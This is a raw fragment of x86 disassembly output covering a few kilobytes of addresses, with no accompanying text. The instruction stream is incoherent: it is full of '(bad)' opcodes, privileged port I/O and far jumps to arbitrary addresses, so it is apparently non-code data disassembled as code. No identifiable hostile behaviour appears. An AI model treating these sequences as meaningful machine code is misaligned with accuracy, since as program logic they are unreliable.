  41f659:	fistp  WORD PTR [edx-0x684590a0]
  41f65f:	mov    ecx,0x18f5e348
  41f664:	add    al,0xf8
  41f667:	sub    al,0x24
  41f669:	ds pop ebx
  41f66b:	mov    WORD PTR [eax+edx*1-0x7ab3b6da],es
  41f672:	push   0xffffffb5
  41f674:	pop    esi
  41f675:	pop    ds
  41f676:	cmp    bl,BYTE PTR [edi+0x42]
  41f679:	inc    edx
  41f67a:	int    0x7a
  41f67c:	cmp    al,0x4c
  41f67e:	add    cl,BYTE PTR [ebx-0x5b]
  41f681:	outs   dx,BYTE PTR ds:[esi]
  41f682:	clc    
  41f683:	(bad)  
  41f684:	gs xor al,0x16
  41f687:	aaa    
  41f688:	xor    DWORD PTR ss:[eax-0x3c7250cb],esi
  41f68f:	cld    
  41f690:	push   edx
  41f691:	ins    BYTE PTR es:[edi],dx
  41f692:	in     al,0x1b
  41f694:	mov    ds:0x27004c29,al
  41f699:	ja     0x41f6f7
  41f69b:	mov    edx,0x734d55ae
  41f6a0:	mov    bl,ch
  41f6a2:	enter  0x4530,0xd7
  41f6a6:	and    bl,BYTE PTR [edx]
  41f6a8:	(bad)  
  41f6a9:	cs clc 
  41f6ab:	leave  
  41f6ac:	mov    DWORD PTR [ebp+0x16],edi
  41f6af:	arpl   WORD PTR [ebx+edi*2],bp
  41f6b2:	jnp    0x41f6ac
  41f6b4:	test   BYTE PTR [eax],0x0
	...
  41f713:	add    BYTE PTR [eax],al
  41f715:	add    BYTE PTR [edx-0x5081dcc4],dl
  41f71b:	jg     0x41f6fc
  41f71d:	cld    
  41f71e:	dec    ecx
  41f71f:	loope  0x41f6f2
  41f721:	sbb    DWORD PTR [ecx-0x2f],ebx
  41f724:	xor    edi,esi
  41f726:	dec    edx
  41f727:	dec    ebp
  41f728:	add    DWORD PTR [eax],eax
  41f72a:	pop    es
  41f72b:	add    DWORD PTR [eax],eax
  41f72d:	add    dl,ch
  41f72f:	or     cl,BYTE PTR [ebp-0x53]
  41f732:	pop    ds
  41f733:	das    
  41f734:	inc    ebp
  41f735:	call   0x70f0:0xb7df8335
  41f73c:	mov    eax,0xebc71786
  41f741:	jns    0x41f76d
  41f743:	imul   edi,DWORD PTR [edi+0x3c],0x56ef4ad9
  41f74a:	mov    ds:0xebba0423,eax
  41f74f:	es ins BYTE PTR es:[di],dx
  41f752:	ret    
  41f753:	das    
  41f754:	push   ecx
  41f755:	push   edx
  41f756:	ss lahf 
  41f758:	(bad)  
  41f75a:	xchg   ebp,eax
  41f75b:	jge    0x41f707
  41f75d:	push   ecx
  41f75e:	aas    
  41f75f:	xchg   edi,eax
  41f760:	loopne 0x41f72a
  41f762:	and    al,0xa4
  41f764:	iret   
  41f765:	mov    ss:0x2558ea95,al
  41f76b:	sbb    al,BYTE PTR [edi]
  41f76d:	out    0xef,eax
  41f76f:	pop    ebp
  41f770:	sub    DWORD PTR [edx+0x3b],ecx
  41f773:	sbb    bh,bh
  41f775:	clc    
  41f776:	and    BYTE PTR [ebx],bl
  41f778:	rcl    BYTE PTR [ecx+0x25aac010],cl
  41f77e:	sbb    al,0xfb
  41f780:	pop    edi
  41f781:	jbe    0x41f78d
  41f783:	pop    ecx
  41f784:	sub    edi,DWORD PTR [edx+edi*8]
  41f787:	les    esp,FWORD PTR [ebx+0x72d78c32]
  41f78d:	pop    ss
  41f78e:	js     0x41f79d
  41f790:	xabort 0xfb
  41f793:	ret    
  41f794:	lods   eax,DWORD PTR ds:[esi]
  41f795:	imul   edx,ebp,0x6a5f89f7
  41f79b:	retf   
  41f79c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41f79d:	das    
  41f79e:	cli    
  41f79f:	jae    0x41f7a1
  41f7a1:	jae    0x23eaafd4
  41f7a7:	xchg   ecx,eax
  41f7a8:	ficom  WORD PTR [esi-0x6815788a]
  41f7ae:	jns    0x41f736
  41f7b0:	or     esp,esi
  41f7b2:	mov    al,ds:0xe3f6b162
  41f7b7:	push   cs
  41f7b8:	xor    edi,edx
  41f7ba:	dec    ecx
  41f7bb:	fs js  0x41f747
  41f7be:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41f7bf:	xor    al,0xc
  41f7c1:	scas   eax,DWORD PTR es:[edi]
  41f7c2:	int    0xe6
  41f7c4:	mov    esp,DWORD PTR [esi]
  41f7c6:	add    edx,esp
  41f7c8:	inc    esi
  41f7c9:	jbe    0x41f7df
  41f7cb:	push   ecx
  41f7cc:	mov    esp,0x87cfcc02
  41f7d1:	(bad)  
  41f7d2:	fwait
  41f7d3:	aad    0x17
  41f7d5:	fdivr  QWORD PTR [edx-0x7a]
  41f7d8:	dec    ebp
  41f7d9:	mov    dh,0x83
  41f7db:	mov    al,0xac
  41f7dd:	xchg   ecx,eax
  41f7de:	out    dx,al
  41f7df:	sub    DWORD PTR [ebx+0x35b7aa51],eax
  41f7e5:	xchg   ebp,eax
  41f7e6:	cmp    DWORD PTR [esi+0x14ac79a1],esp
  41f7ec:	(bad)  
  41f7ed:	lahf   
  41f7ee:	jno    0x41f798
  41f7f0:	mov    bh,0xc0
  41f7f2:	dec    esp
  41f7f3:	sbb    eax,0xe32ef129
  41f7f8:	xchg   ecx,eax
  41f7f9:	rol    BYTE PTR [eax+eiz*1-0x25],cl
  41f7fd:	cli    
  41f7fe:	lds    esp,FWORD PTR [edi]
  41f800:	repnz cmp ebx,DWORD PTR [edx-0xded7bfe]
  41f807:	das    
  41f808:	pop    edi
  41f809:	sti    
  41f80a:	jp     0x41f78e
  41f80c:	mov    dl,0xf6
  41f80e:	mov    ecx,0x46081945
  41f813:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41f814:	fist   DWORD PTR [ebp-0x5c]
  41f817:	jp     0x41f833
  41f819:	xchg   esp,eax
  41f81a:	and    eax,DWORD PTR [ecx-0x77eed04d]
  41f820:	rol    DWORD PTR [edx+0x6a485fc9],1
  41f826:	pop    ds
  41f827:	sbb    BYTE PTR [edi+0x7b55f010],bh
  41f82d:	(bad)  
  41f82e:	jge    0x41f7d8
  41f830:	cmp    ch,BYTE PTR [edx+0xca46fb]
	...
  41f896:	mov    eax,ds:0x3b920b9a
  41f89b:	xchg   ebx,eax
  41f89c:	mov    ecx,0x25be46bb
  41f8a1:	mov    esp,DWORD PTR [esi+0x5180c48d]
  41f8a7:	dec    esi
  41f8a8:	add    DWORD PTR [eax],eax
  41f8aa:	pop    es
  41f8ab:	add    DWORD PTR [eax],eax
  41f8ad:	add    BYTE PTR [ebx],dh
  41f8af:	rcl    ch,cl
  41f8b1:	in     al,dx
  41f8b2:	jo     0x41f8c6
  41f8b4:	dec    edi
  41f8b5:	sbb    al,0xcb
  41f8b7:	mov    dl,0xd6
  41f8b9:	inc    esi
  41f8ba:	int    0x79
  41f8bc:	int3   
  41f8bd:	sbb    eax,0xd44b3131
  41f8c2:	outs   dx,BYTE PTR ds:[esi]
  41f8c3:	outs   dx,DWORD PTR ds:[esi]
  41f8c4:	js     0x41f862
  41f8c6:	or     al,0x31
  41f8c8:	sbb    BYTE PTR [eax-0x7474d222],ah
  41f8ce:	inc    ebp
  41f8cf:	mov    BYTE PTR ds:0xaf222bec,ah
  41f8d5:	add    BYTE PTR [eax],dl
  41f8d7:	jle    0x41f864
  41f8d9:	in     al,0xa9
  41f8db:	cmc    
  41f8dc:	pusha  
  41f8dd:	sar    BYTE PTR [esi-0x61],cl
  41f8e0:	add    al,0x78
  41f8e2:	fs push cs
  41f8e4:	shl    DWORD PTR [eax-0x9],0xee
  41f8e8:	jle    0x41f8ee
  41f8ea:	push   0x0
  41f8ec:	sbb    al,0xb1
  41f8ee:	fcmove st,st(5)
  41f8f0:	mul    BYTE PTR [esi+0x9]
  41f8f3:	jp     0x41f8da
  41f8f5:	fadd   QWORD PTR [ebx+0xc]
  41f8f8:	dec    ebx
  41f8f9:	je     0x41f898
  41f8fb:	mov    ch,0xad
  41f8fd:	call   0x601bbfd2
  41f902:	fistp  DWORD PTR [ebp+0x19a7bee5]
  41f908:	es stc 
  41f90a:	adc    esp,DWORD PTR [ecx-0x206609bd]
  41f910:	mov    ebx,0xf06e6fa8
  41f915:	fidiv  WORD PTR [eax-0x57]
  41f918:	sbb    ecx,DWORD PTR [ebx]
  41f91a:	int    0x71
  41f91c:	dec    edx
  41f91d:	leave  
  41f91e:	das    
  41f91f:	mov    ecx,0xf6c1b584
  41f924:	(bad)  
  41f925:	lods   eax,DWORD PTR ds:[esi]
  41f926:	add    dl,BYTE PTR [ebp-0x485303b]
  41f92c:	dec    edi
  41f92d:	xor    ah,BYTE PTR [ebx]
  41f92f:	mov    fs,WORD PTR [edi+0x67fe06a0]
  41f935:	cmp    esi,ecx
  41f937:	aad    0x79
  41f939:	xor    BYTE PTR [ebx+ebp*1-0x37e8e111],0x76
  41f941:	and    DWORD PTR [edi],0x35
  41f944:	ds jae 0x41f8de
  41f947:	inc    eax
  41f948:	adc    BYTE PTR [eax+ebp*2-0x2163164f],ch
  41f94f:	adc    ebp,0x78
  41f952:	hlt    
  41f953:	sti    
  41f954:	pop    es
  41f955:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41f956:	cmp    dh,BYTE PTR [esi-0x3a938ab6]
  41f95c:	xchg   esp,eax
  41f95d:	adc    esp,DWORD PTR [edi-0x6baf1018]
  41f963:	(bad)  
  41f964:	fs out dx,eax
  41f966:	xchg   esp,eax
  41f967:	int3   
  41f968:	inc    ebp
  41f969:	cmp    DWORD PTR [edi+eax*1],esp
  41f96c:	push   DWORD PTR [eax+0x70]
  41f96f:	jg     0x41f8fe
  41f971:	jecxz  0x41f91f
  41f973:	fs push es
  41f975:	dec    eax
  41f976:	sub    esp,eax
  41f978:	cmp    ch,BYTE PTR [eax]
  41f97a:	mov    ds:0xe041793b,eax
  41f97f:	lods   eax,DWORD PTR ds:[esi]
  41f980:	into   
  41f981:	aad    0xa9
  41f983:	cli    
  41f984:	add    edi,DWORD PTR [edi+0x35]
  41f987:	or     eax,0xff0cd684
  41f98c:	pop    ebp
  41f98d:	mov    eax,0xedfde1
  41f992:	arpl   cx,bp
  41f994:	aaa    
  41f995:	jb     0x41f9fe
  41f997:	or     al,0x6c
  41f999:	es cld 
  41f99b:	(bad)  
  41f99c:	repnz shr DWORD PTR [ebx+0x1dcaed72],0x77
  41f9a4:	nop
  41f9a5:	sbb    al,0xb0
  41f9a7:	xchg   al,dh
  41f9a9:	inc    ebp
  41f9aa:	xor    bl,cl
  41f9ac:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41f9ad:	pushf  
  41f9ae:	pop    ebp
  41f9af:	sub    esp,DWORD PTR ds:0x11db568d
	...
  41fa15:	add    BYTE PTR [edx],cl
  41fa17:	inc    ecx
  41fa18:	mov    bh,0xa1
  41fa1a:	push   edi
  41fa1c:	push   ds
  41fa1d:	jmp    0x41f9ba
  41fa1f:	mov    eax,0x14df8e70
  41fa24:	in     eax,dx
  41fa25:	adc    eax,0x14f58
  41fa2a:	pop    es
  41fa2b:	add    DWORD PTR [eax],eax
  41fa2d:	add    BYTE PTR [esi+eax*8+0x1],ah
  41fa31:	(bad)  
  41fa32:	and    DWORD PTR [edx],eax
  41fa34:	sub    DWORD PTR [ebp+0xa],edi
  41fa37:	mov    ds:0xe36de312,eax
  41fa3c:	loope  0x41fa72
  41fa3e:	stos   DWORD PTR es:[edi],eax
  41fa3f:	xchg   DWORD PTR [eax-0x80],esi
  41fa42:	sti    
  41fa43:	jl     0x41f9c8
  41fa45:	stc    
  41fa46:	pop    edi
  41fa47:	adc    DWORD PTR [ebp+0x9],ebp
  41fa4a:	cmp    ch,BYTE PTR [edi]
  41fa4c:	fstp   DWORD PTR [esp+ecx*2-0x6f488767]
  41fa53:	imul   edx,DWORD PTR [eax],0xe2bf9ec7
  41fa59:	sti    
  41fa5a:	inc    eax
  41fa5b:	xchg   BYTE PTR ds:0xd6f0810,ah
  41fa61:	xchg   ecx,eax
  41fa62:	sbb    cl,BYTE PTR [edi+ebp*8-0x787a6886]
  41fa69:	jmp    0x41fa27
  41fa6b:	and    al,0x2a
  41fa6d:	pop    esi
  41fa6e:	mov    ecx,esp
  41fa70:	dec    eax
  41fa71:	imul   ebx,DWORD PTR [ecx+0x7b],0xf8766543
  41fa78:	jne    0x41fab9
  41fa7a:	xor    bl,BYTE PTR [edx+0x16]
  41fa7d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41fa7e:	(bad)  
  41fa7f:	aam    0x2e
  41fa81:	in     al,dx
  41fa82:	xchg   ebx,eax
  41fa83:	pop    ss
  41fa84:	push   es
  41fa85:	push   ecx
  41fa86:	into   
  41fa87:	pop    eax
  41fa88:	je     0x41fa62
  41fa8a:	pop    esp
  41fa8b:	ja     0x41fa13
  41fa8d:	out    0xbf,al
  41fa8f:	add    esp,ebx
  41fa91:	inc    eax
  41fa92:	push   esi
  41fa93:	rcr    BYTE PTR [esi],cl
  41fa95:	cmc    
  41fa96:	das    
  41fa97:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41fa98:	sti    
  41fa99:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41fa9a:	fidiv  DWORD PTR [eax+esi*1]
  41fa9d:	xlat   BYTE PTR ds:[ebx]
  41fa9e:	pushf  
  41fa9f:	stos   BYTE PTR es:[edi],al
  41faa0:	cli    
  41faa1:	cmp    eax,0xf3dd0bf4
  41faa6:	adc    ebx,ebx
  41faa8:	add    esp,0x4
  41faab:	jbe    0x41faa6
  41faad:	dec    ebp
  41faae:	inc    esi
  41faaf:	into   
  41fab0:	mov    WORD PTR [esi],es
  41fab2:	and    al,0x63
  41fab4:	jecxz  0x41faf4
  41fab6:	push   esp
  41fab7:	mov    gs,edi
  41fab9:	mov    esi,0x5e72b8bb
  41fabe:	ret    0xe5d
  41fac1:	inc    ebp
  41fac2:	jmp    0xddd3:0xbdb0693
  41fac9:	inc    eax
  41faca:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41facb:	sbb    ch,BYTE PTR [esi]
  41facd:	jnp    0x41fac6
  41facf:	sub    al,0xfa
  41fad1:	inc    esp
  41fad2:	idiv   dl
  41fad4:	mov    ebx,0x29381960
  41fad9:	jb     0x41fb25
  41fadb:	retw   0xcf37
  41fadf:	mov    bl,0x1b
  41fae1:	scas   al,BYTE PTR es:[edi]
  41fae2:	pop    ds
  41fae3:	xchg   ecx,eax
  41fae4:	gs pop ds
  41fae6:	sahf   
  41fae7:	mov    al,0xa9
  41fae9:	imul   esp,DWORD PTR [eax+0xc],0x46
  41faed:	cmp    eax,0x1f5ef0f8
  41faf2:	ja     0x41faf1
  41faf4:	inc    edi
  41faf5:	stc    
  41faf6:	cwde   
  41faf7:	adc    DWORD PTR [esi-0x43],0xffffff92
  41fafb:	xchg   edx,eax
  41fafc:	nop
  41fafd:	xchg   edi,eax
  41fafe:	(bad)  
  41faff:	sbb    DWORD PTR [ebx-0x7cc91e32],esp
  41fb05:	jmp    0xcbf9:0x73374cbe
  41fb0c:	adc    esi,eax
  41fb0e:	xchg   ebp,eax
  41fb0f:	mov    cl,0xc0
  41fb11:	or     BYTE PTR [ecx+0x4c59069b],cl
  41fb17:	xchg   ebx,eax
  41fb18:	ins    BYTE PTR es:[edi],dx
  41fb19:	jo     0x41fb47
  41fb1b:	jb     0x41fabb
  41fb1d:	das    
  41fb1e:	shr    BYTE PTR [ebp-0x76724881],cl
  41fb24:	mov    DWORD PTR [ebp+0x4ee8b0b8],ebx
  41fb2a:	jae    0x41fb95
  41fb2c:	mov    esp,edx
  41fb2e:	dec    ebp
  41fb2f:	ja     0x41fb52
  41fb31:	xor    DWORD PTR [eax+ecx*4+0x5f],0x0
	...
  41fb94:	add    BYTE PTR [eax],al
  41fb96:	fsubr  QWORD PTR [eax]
  41fb98:	mov    ah,ah
  41fb9a:	(bad)  
  41fb9b:	out    0xfe,al
  41fb9d:	cmp    cl,ah
  41fb9f:	cmc    
  41fba0:	push   cs
  41fba1:	adc    al,0xba
  41fba3:	adc    ah,BYTE PTR [edi+0x1505f92]
  41fba9:	add    BYTE PTR [edi],al
  41fbab:	add    DWORD PTR [eax],eax
  41fbad:	add    BYTE PTR [ecx-0x1b],cl
  41fbb0:	in     eax,0x4c
  41fbb2:	cmp    edx,0xffffffa1
  41fbb5:	fidivr WORD PTR [edi+0x1a]
  41fbb8:	cs cdq 
  41fbba:	push   0xffffffa1
  41fbbc:	and    DWORD PTR [ebp+0x37195696],eax
  41fbc2:	imul   ch
  41fbc4:	pop    edi
  41fbc5:	sub    ebx,DWORD PTR [ecx+eax*8+0x7a]
  41fbc9:	dec    eax
  41fbca:	pop    esi
  41fbcc:	nop
  41fbcd:	out    0x41,eax
  41fbcf:	je     0x41fc48
  41fbd1:	xor    edx,DWORD PTR [esi-0x6a]
  41fbd4:	pushf  
  41fbd5:	or     DWORD PTR ds:0x61070f09,0xffffffa9
  41fbdc:	sub    BYTE PTR [edi-0x19],0xa4
  41fbe0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41fbe1:	call   0xa486ff05
  41fbe6:	test   BYTE PTR [ebx+0x56e83a6d],bh
  41fbec:	adc    DWORD PTR [ecx],ecx
  41fbee:	clc    
  41fbef:	inc    eax
  41fbf0:	ja     0x41fc29
  41fbf2:	cmc    
  41fbf3:	loopne 0x41fbf6
  41fbf5:	cmc    
  41fbf6:	sbb    DWORD PTR [ebx-0x60d03e3e],esp
  41fbfc:	jmp    0x41fbe5
  41fbfe:	popa   
  41fbff:	jb     0x41fc80
  41fc01:	lock sub DWORD PTR [edi+eax*4+0x45],0xdc16fe84
  41fc0a:	inc    edx
  41fc0b:	or     DWORD PTR [esi+0x2c],edx
  41fc0e:	jnp    0x41fc05
  41fc10:	ss xchg ecx,eax
  41fc12:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41fc13:	cmp    dh,ch
  41fc15:	in     eax,0xa
  41fc17:	inc    eax
  41fc18:	inc    ecx
  41fc19:	sub    edi,DWORD PTR [edx]
  41fc1b:	ror    ah,1
  41fc1d:	aad    0x42
  41fc1f:	jg     0x41fbaa
  41fc21:	jl     0x41fc6c
  41fc23:	je     0x41fc28
  41fc25:	inc    ecx
  41fc26:	(bad)  
  41fc27:	fdivr  QWORD PTR [ebx]
  41fc29:	or     dh,BYTE PTR [esi]
  41fc2b:	mov    ebx,esp
  41fc2d:	jne    0x41fbf4
  41fc2f:	iret   
  41fc30:	in     al,dx
  41fc31:	fldcw  WORD PTR [ebx-0x2b]
  41fc34:	inc    esp
  41fc35:	inc    ebp
  41fc36:	out    dx,al
  41fc37:	xchg   cl,al
  41fc39:	or     edx,ebx
  41fc3b:	shl    DWORD PTR [ebx],1
  41fc3d:	add    ebx,eax
  41fc3f:	popa   
  41fc40:	imul   esi,DWORD PTR [edx],0x48
  41fc43:	and    DWORD PTR [edx+ebx*1],esp
  41fc46:	out    dx,eax
  41fc47:	mov    bh,0xc3
  41fc49:	push   esp
  41fc4a:	and    ebp,DWORD PTR [esi+0x4a0c4e87]
  41fc50:	sbb    DWORD PTR [ebp+0x4],edi
  41fc53:	xchg   ecx,eax
  41fc54:	data16 clc 
  41fc56:	fwait
  41fc57:	pop    esp
  41fc58:	xchg   ebp,eax
  41fc59:	sbb    BYTE PTR [esi],0x30
  41fc5c:	xchg   edx,eax
  41fc5d:	repz sahf 
  41fc5f:	lahf   
  41fc60:	and    BYTE PTR [edi-0x4b044056],ch
  41fc66:	xor    bl,BYTE PTR [ebx+0x6b]
  41fc69:	inc    esp
  41fc6a:	stc    
  41fc6b:	sub    edx,DWORD PTR [edi+0x59bb1179]
  41fc71:	(bad)  
  41fc72:	enter  0xf386,0xb7
  41fc76:	or     eax,0xf862a61c
  41fc7b:	push   ebp
  41fc7c:	test   al,0x4d
  41fc7e:	iret   
  41fc7f:	or     DWORD PTR [edx],eax
  41fc81:	sahf   
  41fc82:	dec    esp
  41fc83:	fistp  WORD PTR [edi+edi*4+0x69]
  41fc87:	mov    al,0x71
  41fc89:	test   DWORD PTR [eax+0x43],0x9c573f50
  41fc90:	outs   dx,DWORD PTR ds:[esi]
  41fc91:	xchg   esi,eax
  41fc92:	xchg   dh,ah
  41fc94:	sub    al,BYTE PTR [ecx]
  41fc96:	or     DWORD PTR [edi-0x57],esp
  41fc99:	(bad)  
  41fc9a:	gs sti 
  41fc9c:	ret    0xdbff
  41fc9f:	fwait
  41fca0:	jmp    0x793113d5
  41fca5:	popf   
  41fca6:	xchg   edi,eax
  41fca7:	sbb    BYTE PTR [edi+0x1f],0x70
  41fcab:	mov    ds:0x6b1508c0,eax
  41fcb0:	push   DWORD PTR [edx]
  41fcb2:	adc    DWORD PTR [edi+0xcc],esp
	...
  41fd14:	add    BYTE PTR [eax],al
  41fd16:	or     al,0x6a
  41fd18:	push   edx
  41fd19:	shl    DWORD PTR [esi-0x7],0x9f
  41fd1d:	out    dx,eax
  41fd1e:	je     0x41fd3b
  41fd20:	pop    ebp
  41fd21:	inc    edi
  41fd22:	xchg   esi,eax
  41fd23:	stc    
  41fd24:	sbb    eax,0x1516673
  41fd29:	add    BYTE PTR [edi],al
  41fd2b:	add    DWORD PTR [eax],eax
  41fd2d:	add    BYTE PTR [edx+ebp*8-0x7571eb7b],ch
  41fd34:	add    DWORD PTR [ebp-0x64],esp
  41fd37:	call   0x7b58:0xc2674a6a
  41fd3e:	call   0xaf4:0x6a10230
  41fd45:	push   cs
  41fd46:	mov    ah,0x21
  41fd48:	aad    0x3c
  41fd4a:	jmp    0x7ed1:0xfe6efa7b
  41fd51:	sbb    DWORD PTR [ebx-0x5c],esi
  41fd54:	outs   dx,DWORD PTR ds:[esi]
  41fd55:	enter  0x20fb,0x59
  41fd59:	ss or  cl,dl
  41fd5c:	cmp    edx,DWORD PTR [ecx]
  41fd5e:	push   0x60534b42
  41fd63:	sti    
  41fd64:	xchg   ebx,eax
  41fd65:	or     al,0x6d
  41fd67:	pop    es
  41fd68:	popf   
  41fd69:	add    al,bh
  41fd6b:	pusha  
  41fd6c:	mov    edx,0xa0cdfaaa
  41fd71:	out    dx,al
  41fd72:	out    dx,eax
  41fd73:	lea    esp,[edx]
  41fd75:	adc    BYTE PTR [eax+edx*2],ch
  41fd78:	pop    ebx
  41fd79:	test   DWORD PTR [edi+0x5a],0x9fcea80c
  41fd80:	pop    ebx
  41fd81:	clc    
  41fd82:	leave  
  41fd83:	jnp    0x41fdb2
  41fd85:	xor    BYTE PTR [ebx+ecx*8+0x42],ch
  41fd89:	jmp    0x87ed96d0
  41fd8e:	mov    al,ds:0x3a11f203
  41fd93:	fild   WORD PTR [esi]
  41fd95:	aas    
  41fd96:	fiadd  WORD PTR [ebp-0x48]
  41fd99:	mov    eax,0xb22f3e84
  41fd9e:	and    dl,BYTE PTR [ebp-0x7]
  41fda1:	out    0x2e,eax
  41fda3:	xchg   ecx,eax
  41fda4:	iret   
  41fda5:	cdq    
  41fda6:	pushf  
  41fda7:	inc    edx
  41fda8:	or     eax,0x36c1dd2e
  41fdad:	pushf  
  41fdae:	and    eax,0x667c9512
  41fdb3:	sbb    BYTE PTR [edi+0x3e98abd6],dh
  41fdb9:	jns    0x41fd7b
  41fdbb:	cld    
  41fdbc:	jmp    0x28dd172e
  41fdc1:	cli    
  41fdc2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41fdc3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41fdc4:	adc    ebx,0x6f40eea4
  41fdca:	outs   dx,DWORD PTR ds:[esi]
  41fdcb:	pop    ss
  41fdcc:	jae    0x41fdaa
  41fdce:	std    
  41fdcf:	push   esi
  41fdd0:	hlt    
  41fdd1:	or     BYTE PTR [edx],dl
  41fdd3:	test   eax,0x91fa9856
  41fdd8:	je     0x41fd9f
  41fdda:	retf   
  41fddb:	std    
  41fddc:	push   eax
  41fddd:	xchg   esi,eax
  41fdde:	cmp    al,BYTE PTR [ebx]
  41fde0:	add    ebp,DWORD PTR [edx-0x2c]
  41fde3:	mov    cl,BYTE PTR ds:0x5041ee0e
  41fde9:	sbb    eax,0xa7cb96a1
  41fdee:	fs (bad) 
  41fdf0:	cmp    cl,BYTE PTR [esi]
  41fdf2:	gs daa 
  41fdf4:	jmp    0x9f3888f4
  41fdf9:	xchg   DWORD PTR [ebp+0x1],ebx
  41fdfc:	jo     0x41fdf6
  41fdfe:	and    DWORD PTR [edx-0x51],esp
  41fe01:	mov    dl,ch
  41fe03:	push   0x22
  41fe05:	xchg   ebp,eax
  41fe06:	data16 mov ds:0x5d3613d2,al
  41fe0c:	scas   eax,DWORD PTR es:[edi]
  41fe0d:	push   esp
  41fe0e:	xor    al,0x91
  41fe10:	inc    eax
  41fe11:	jae    0x41fe04
  41fe13:	sar    DWORD PTR [esi],0xdc
  41fe16:	and    BYTE PTR [ebx],dl
  41fe18:	pushf  
  41fe19:	add    DWORD PTR [esi+0x29],edx
  41fe1c:	cmp    eax,0x25b44ae0
  41fe21:	jae    0x41fe43
  41fe23:	cli    
  41fe24:	mov    bl,0x9e
  41fe26:	and    DWORD PTR [esi-0x3c19d2e8],eax
  41fe2c:	(bad)
  41fe30:	in     eax,dx
  41fe31:	lock cdq 
  41fe33:	lods   al,BYTE PTR ds:[esi]
  41fe34:	and    eax,DWORD PTR [eax]
	...
  41fe96:	stos   BYTE PTR es:[edi],al
  41fe97:	push   ebp
  41fe98:	call   0x515d:0xffefffe7
  41fe9f:	lock xor DWORD PTR [edi+0x4],0x0
  41fea4:	call   0x1946bb8
  41fea9:	add    BYTE PTR [edi],al
  41feab:	add    DWORD PTR [eax],eax
  41fead:	add    BYTE PTR [ebx+0x0],bl
  41feb0:	pop    esi
  41feb1:	adc    eax,0x502942e8
  41feb6:	push   esp
  41feb7:	jne    0x41fe66
  41feb9:	hlt    
  41feba:	aad    0xe1
  41febc:	jmp    0x5038379a
  41fec1:	mov    ch,0xca
  41fec3:	(bad)  
  41fec4:	repnz shl BYTE PTR [eax+0x2ca32044],0x21
  41fecc:	loopne 0x41fe7e
  41fece:	xchg   edx,eax
  41fecf:	adc    BYTE PTR [eax-0x31494979],cl
  41fed5:	pop    es
  41fed6:	loop   0x41feef
  41fed8:	or     ah,BYTE PTR [ecx-0x6811dc39]
  41fede:	xor    ebp,eax
  41fee0:	enter  0xbeb5,0xbf
  41fee4:	jg     0x41fe9a
  41fee6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41fee7:	sbb    BYTE PTR [edx],al
  41fee9:	xchg   DWORD PTR [ebx+0x50bee049],ebp
  41feef:	in     al,0x3f
  41fef1:	ss and bh,al
  41fef4:	jle    0x41ff58
  41fef6:	stos   DWORD PTR es:[edi],eax
  41fef7:	fadd   DWORD PTR [edi+0x58]
  41fefa:	les    ebp,FWORD PTR [eax+0x7e]
  41fefd:	stc    
  41fefe:	stc    
  41feff:	cli    
  41ff00:	imul   ebx,ecx,0x23
  41ff03:	ret    0x7685
  41ff06:	ret    
  41ff07:	cs inc eax
  41ff09:	test   BYTE PTR [ebx-0x35],dl
  41ff0c:	test   eax,0xcdb617c6
  41ff11:	adc    eax,0x8578e840
  41ff16:	pop    ds
  41ff17:	mov    ds:0x9b58554d,eax
  41ff1c:	mov    edx,0x9d6c4cb2
  41ff21:	loope  0x41ff02
  41ff23:	rol    DWORD PTR [ebp+eiz*1+0x7e],0x0
  41ff28:	fmul   DWORD PTR [ecx-0xab2ea3a]
  41ff2e:	push   es
  41ff2f:	ss sbb eax,0x8f3ce8d9
  41ff35:	aad    0x56
  41ff37:	or     ecx,0xfffffffc
  41ff3a:	mov    bh,BYTE PTR [eax]
  41ff3c:	mov    edx,0x7f3d29be
  41ff41:	or     DWORD PTR [esi-0x723824de],ebx
  41ff47:	pop    edx
  41ff48:	iret   
  41ff49:	jmp    0xa85efc96
  41ff4e:	push   eax
  41ff4f:	push   cs
  41ff50:	sub    BYTE PTR [edx+0x75c0a9f6],bl
  41ff56:	sbb    eax,0x53a88b3e
  41ff5b:	adc    cl,BYTE PTR [edx]
  41ff5d:	jg     0x41ff0b
  41ff5f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41ff60:	int3   
  41ff61:	repz mov ebx,0x3fd02e0b
  41ff67:	test   BYTE PTR [esi+esi*8+0x6716126f],dl
  41ff6e:	lods   al,BYTE PTR ds:[esi]
  41ff6f:	xchg   esi,eax
  41ff70:	ss sub cl,0xd0
  41ff74:	lock and esp,DWORD PTR cs:[ecx]
  41ff78:	xchg   DWORD PTR [esi+0x74],ebp
  41ff7b:	cmc    
  41ff7c:	inc    edi
  41ff7d:	dec    ebx
  41ff7e:	rcl    DWORD PTR [eax-0x31],0x13
  41ff82:	mov    eax,0x5f348b03
  41ff87:	jo     0x41ff5d
  41ff89:	pop    ds
  41ff8a:	ins    BYTE PTR es:[edi],dx
  41ff8b:	(bad)  
  41ff8c:	sbb    eax,0x79803e
  41ff91:	xor    bh,cl
  41ff93:	mov    ecx,0xd136579d
  41ff98:	adc    ch,bl
  41ff9a:	(bad)  
  41ff9b:	rol    BYTE PTR [ebx-0x47],1
  41ff9e:	inc    ebp
  41ff9f:	xchg   BYTE PTR [esp+ecx*1],ch
  41ffa2:	sbb    BYTE PTR [esi-0x4],0x4e
  41ffa6:	dec    ebp
  41ffa7:	or     BYTE PTR [edx+eiz*1],0xed
  41ffab:	ds pushf 
  41ffad:	jmp    0x41ffc6
  41ffaf:	and    DWORD PTR [ecx],edi
  41ffb1:	icebp  
  41ffb2:	scas   al,BYTE PTR es:[edi]
  41ffb3:	mov    eax,ds:0x7a
	...
  420014:	add    BYTE PTR [eax],al
